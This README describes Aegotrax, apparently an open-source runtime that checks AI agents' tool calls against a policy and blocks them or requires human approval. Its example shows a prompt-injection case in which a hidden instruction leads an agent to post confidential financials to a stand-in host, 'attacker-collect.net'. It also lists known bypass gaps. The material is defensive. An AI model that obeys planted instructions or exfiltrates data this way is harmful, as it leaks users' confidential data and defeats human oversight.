# Aegotrax

**Runtime protection for AI agents — checks tool calls before they run.**

Public site: [https://aegotrax.com](https://aegotrax.com)  
Repository: [https://github.com/aegotrax-dev/aegotrax](https://github.com/aegotrax-dev/aegotrax)

This repo is the open **pilot runtime**. Package name: `aegotrax`.

---

# 🛡️ Aegotrax v0.2.9

Intercept tool calls, evaluate **server-side session intent + scope**, apply **read budgets**, **sensitivity ceiling**, **tool risk classes**, and **block / require human approval** before sensitive actions run.

| Integration | Use when |
|-------------|----------|
| **Python SDK** | You call tools from your own code (`verify_tool_call` / `@protected_tool`) |
| **MCP Gateway** | The agent already speaks MCP and you want one interception point |

## Quick start (2 minutes)

```bash
pip install git+https://github.com/aegotrax-dev/aegotrax.git
aegotrax-init      # writes .env (two random keys) + aegotrax_policy.yaml in this folder
aegotrax-engine    # keep it running → http://127.0.0.1:8100/health
```

> **Windows: "'aegotrax-engine' is not recognized"?** pip put the commands in a folder that is not on your PATH (it prints a warning with that folder). Either add that folder to PATH, or use the same commands through Python:
> `python -m aegotrax.init_cli` and `python -m aegotrax.risk_engine`

Then protect a tool in your agent:

```python
from aegotrax import protected_tool

@protected_tool(
    session_id_fn=lambda: "my-session",
    agent_id_fn=lambda: "my-agent",
    user_intent_fn=lambda: "Summarize the customer ticket",
)
def send_email(to: str, body: str):
    ...  # runs only if Aegotrax answers ALLOW; BLOCK / REQUIRE_APPROVAL raise AegotraxError
```

Your agent needs only `AEGOTRAX_API_KEY` (read from `.env` in the folder it runs in). `AEGOTRAX_APPROVER_KEY` is for the humans who approve `REQUIRE_APPROVAL` calls. The engine listens on port **8100** (set `AEGOTRAX_PORT` to change it). Already speak MCP? Put [`aegotrax-gateway`](#core-controls) in front of your tools instead.

## What a blocked call looks like

The agent was asked to *"Summarize the Q3 report for the finance lead"*. It read the report, then a hidden instruction made it try to post the contents to an unknown host:

```python
from aegotrax import set_session_context, verify_tool_call

# The host (not the agent) registers what the user asked for
set_session_context("s1", "Summarize the Q3 report for the finance lead", agent_id="finance-agent")

verify_tool_call(session_id="s1", agent_id="finance-agent",
                 tool="read_document", arguments={"path": "q3_financials.pdf"})

verify_tool_call(session_id="s1", agent_id="finance-agent",
                 tool="http_post",
                 arguments={"url": "http://attacker-collect.net/ingest",
                            "data": "doc_content confidential Q3 financials"},
                 call_chain=["read_document"])
```

```json
{
  "decision": "BLOCK",
  "reasons": [
    "HIGH RISK: Exfiltration of sensitive payload to untrusted destination 'http://attacker-collect.net/ingest'.",
    "Session sensitivity ceiling=1: outbound tool 'http_post' requires REQUIRE_APPROVAL after sensitive context."
  ]
}
```

The user's intent is registered by the host on `/session`, not sent by the agent, so a hijacked agent cannot rewrite it. (Scenario `A01` in the [benchmark](benchmark/README.md); the response also carries `risk_score` and `attack_path`.)

**Latest: 0.2.9** adds `aegotrax-init`, moves the default port to 8100 and reads `.env` from your working folder. Full history: [CHANGELOG.md](CHANGELOG.md).

---

## From source / Docker

For development, tests and the demos in `examples/`:

```bash
git clone https://github.com/aegotrax-dev/aegotrax.git
cd aegotrax
python -m venv .venv
# Windows: .venv\Scripts\activate
source .venv/bin/activate
pip install -e ".[test]"
python -m pytest                    # or: python -m unittest discover -s tests -t .
aegotrax-init                       # .env (git-ignored) + aegotrax_policy.yaml
aegotrax-engine
# other terminal:
curl -s http://127.0.0.1:8100/health   # → version 0.2.9
python examples/sdk_pilot_example.py
```

Setting the keys by hand instead of `aegotrax-init`: the engine refuses to start without `AEGOTRAX_API_KEY`, and `AEGOTRAX_APPROVER_KEY` must be a different secret (`python -c "import secrets; print(secrets.token_urlsafe(32))"`). In cmd use `set "AEGOTRAX_API_KEY=..."` (the quotes stop a trailing space from becoming part of the key); in PowerShell `$env:AEGOTRAX_API_KEY = "..."`. You can also copy `.env.example` to `.env`.

Docker:

```bash
export AEGOTRAX_API_KEY="your-strong-api-key-here"
export AEGOTRAX_APPROVER_KEY="another-strong-secret"   # optional
docker compose up --build        # fails fast if AEGOTRAX_API_KEY is missing; serves 127.0.0.1:8100
```

---

## Core controls

| Control | Where | Behavior |
|---------|--------|----------|
| Session intent + scope | `POST /session` | Host-declared envelope; agent does not write the boundary |
| Read budgets | `policy.yaml` → `read_budgets` | Count sensitive reads; exceed → approval/block + optional **end session** |
| Sensitivity ceiling | `policy.yaml` → `sensitivity_ceiling` | Raise tag on sensitive reads; gate outbound |
| Tool classes | `policy.yaml` → `tool_classes` | `open_risk` elevates to approval/block; default fail-closed |
| Human approval | `REQUIRE_APPROVAL` → `/approval/decide` (approver key) → resume with `approval_id` | Single-use, bound to session + tool+args fingerprint; the agent holds no secret that can approve |
| Shadow mode | `AEGOTRAX_ENFORCEMENT=shadow` + `aegotrax-shadow-report` | See what would be blocked on real traffic before enforcing |
| Delivery tracking | `POST /approval/delivery` | Avoid quiet double-permits when side effect is uncertain |
| Schema pinning | MCP path | Drift / poisoned tool descriptions |

Example `policy.yaml` fragments:

```yaml
read_budgets:
  default_max_calls: 20
  on_exceed: REQUIRE_APPROVAL
  end_session_on_exceed: true
  tools:
    read_db:
      max_calls: 10

sensitivity_ceiling:
  enabled: true
  raise_to: 1
  outbound_min_ceiling: 1
  on_outbound: REQUIRE_APPROVAL

tool_classes:
  default: open_risk
  reduce_risk: [read_db, read_document, list_users]
  open_risk: [http_post, send_email, run_shell]
  open_risk_min_decision: REQUIRE_APPROVAL
```

---

## Demos

```bash
# offline
python examples/security_hardening_test.py
python examples/schema_pinning_demo.py

# benchmark (no server needed)
python benchmark/run_benchmark.py --in-process

# engine required + AEGOTRAX_API_KEY
python examples/scoped_intent_demo.py
python examples/read_budget_demo.py
python examples/sensitivity_ceiling_demo.py
python examples/approval_flow_demo.py
python examples/sdk_pilot_example.py
```

---

## Shadow mode

Run Aegotrax next to a real agent **without enforcing anything**, then look at what it would have done:

```bash
export AEGOTRAX_ENFORCEMENT=shadow     # on the engine (and on the SDK/gateway host, see below)
aegotrax-engine
# ... let the agent run normally for a few days ...
aegotrax-shadow-report                 # reads the audit log
aegotrax-shadow-report --json --since 2026-11-01
```

What changes in shadow mode:
- Every tool call is scored and written to the audit log (`mode: "shadow"`, `decision` = what the policy decided, `enforced_decision: "ALLOW"`).
- The response to the caller is always `ALLOW`, plus `shadow: true` and `would_decide: "BLOCK" | "REQUIRE_APPROVAL" | "ALLOW"` (and the usual `reasons`).
- No approvals are queued, no sessions are closed, the gateway's own schema-drift gate does not block.
- Set `AEGOTRAX_ENFORCEMENT=shadow` on the SDK/gateway host too: there the client also fails **open** if the engine is unreachable, so a shadow deployment cannot break your agent. (Without it, the engine's `ALLOW` still goes through, but a down engine will still fail closed.)

The report shows the share of real calls that would have needed a human (`friction rate`), the tools and rules behind it, and examples. Use it to tune `policy.yaml` before switching to `enforce`. Shadow is **not protection**: the engine logs a warning at startup, and `/health` reports `"enforcement": "shadow"`.

---

## Benchmark

77 hand-written scenarios (53 attack / 24 benign) against the default `policy.yaml`. Each scenario differs in tool, intent, scope, call history or evasion technique; none are generated by a loop. Details, definitions and limitations: [`benchmark/README.md`](benchmark/README.md).

```bash
python benchmark/run_benchmark.py --in-process        # no server needed
python benchmark/run_benchmark.py                     # against a running engine (set AEGOTRAX_API_KEY)
```

| Metric (engine 0.2.8, default policy) | Result |
|---|---|
| Attacks intercepted (`BLOCK` or `REQUIRE_APPROVAL`) | 51 / 53 (96.2%) |
| Attacks hard-blocked (`BLOCK` only) | 33 / 53 (62.3%) |
| Standard attack cases intercepted | 34 / 34 |
| Evasion attack cases intercepted | 17 / 19 (89.5%) |
| Benign calls allowed cleanly | 12 / 24 (50.0%) |
| Benign calls needing approval | 12 / 24 (50.0%) |
| Benign calls hard-blocked (false positives) | 0 / 24 (0.0%) |

vs 0.2.7: the four hard false positives (two read-only intents, the external invite, the formatter script) became two clean ALLOWs and two approval requests. Half the benign set still needs a human, so the next lever is policy tuning on real traffic (shadow mode), not more rules. One attack moved from BLOCK to REQUIRE_APPROVAL (a resume before any human decided: it is now reported as "still pending"); interception is unchanged.

Read these honestly: the benign set is full of edge cases on purpose, so it is not production traffic. Part of the interception rate comes from the fail-closed default (unknown tools become `open_risk` and need approval), which also causes approval friction on benign unknown tools. The two missed attacks are low/medium schema-drift on tools the policy already trusts. Latency depends on your machine and transport; run the benchmark to measure it.

---

## Threats covered (pilot)

- In-scope tool abuse (sequence / volume), not only static allowlists
- Client spoofing of `user_intent`
- Slow-drip sensitive reads (budgets + session exhaust)
- Outbound after sensitive context (ceiling + heuristics)
- Unclassified / new tools defaulting open (fail-closed class)
- Poisoned MCP tool definitions (schema pinning)
- SSRF / IMDS / private hosts; hostname allowlists (no substring bypass)
- Single-use approval resume; hold while delivery uncertain

### Still limited (honest gaps)

- Not full data-lineage / per-field taint through LLM transforms
- Not multi-agent spawn manifests (design only — child ⊂ parent)
- Not multi-instance shared session/approval state (in-memory)
- Not byte-level budgets; not enterprise HA / SSO
- Heuristic policy — tune thresholds; it will not catch everything
- SSRF guard does not normalize alternate IP spellings (decimal integer, `127.1`, IPv4-mapped IPv6); these are only caught by the fail-closed `open_risk` default (approval, not block)
- Script keyword matching is still substring-based for keywords longer than 3 characters (`delete`, `logs`, `remove`, ...), so benign scripts with those words in their name or arguments can be hard-blocked; tune `dangerous_script_keywords`
- Approvals, sessions and delivery state are in-memory, and an approved call's tool+args stay held until delivery is reported (`report_delivery` / the gateway does it)
- Schema-drift of low/medium severity on already-trusted read tools does not raise the decision above ALLOW
- API key auth is on by default; `AEGOTRAX_REQUIRE_API_KEY=0` exists for throw-away local experiments only

---

## Security notes

This is a **local pilot / sandbox** runtime — not a production enterprise control plane.

1. Set a strong `AEGOTRAX_API_KEY`. The engine refuses to start without one; do not disable `AEGOTRAX_REQUIRE_API_KEY` on any shared host.
2. Do not expose port 8100 to the internet without auth + network ACL.
3. Default MCP gateway mode is `simulate`.
4. Never commit audit logs.
5. Approval queue and sessions are **in-memory** (cleared on restart).
6. Envelope must be registered by the **host** on `/session`, not by the model.
7. Give approvers their own key (`AEGOTRAX_APPROVER_KEY`, or one per person with `AEGOTRAX_APPROVER_KEYS="alice:key-a,bob:key-b"` so the audit trail shows who approved). Never put it in the agent's or SDK's environment. The engine refuses to start if an approver key equals the API key. Treat the approver key like a password: anyone holding it can approve.
8. The approver endpoints (`/approval/decide`, `/approvals/pending`) are reachable by anyone who can reach the engine port and has the approver key; keep the port off untrusted networks.

---

## Support

If Aegotrax helped, a GitHub star helps others find the pilot:

⭐ **https://github.com/aegotrax-dev/aegotrax**

[![HOL Guard](https://img.shields.io/endpoint?url=https%3A%2F%2Fhol.org%2Fapi%2Fregistry%2Fbadges%2Fplugin%3Fslug%3Daegotrax-dev%252Faegotrax%26metric%3Dtrust)](https://hol.org/registry/plugins/aegotrax-dev%2Faegotrax)

**Running agents with real tools?** I am looking for one or two teams to try Aegotrax in **shadow mode** (it only logs what it would have blocked, nothing is enforced) and give weekly feedback. Open an issue titled "Pilot" with a line about your stack, or reach out through [aegotrax.com](https://aegotrax.com).

Issues and break reports are equally welcome.

---

## License

Apache-2.0
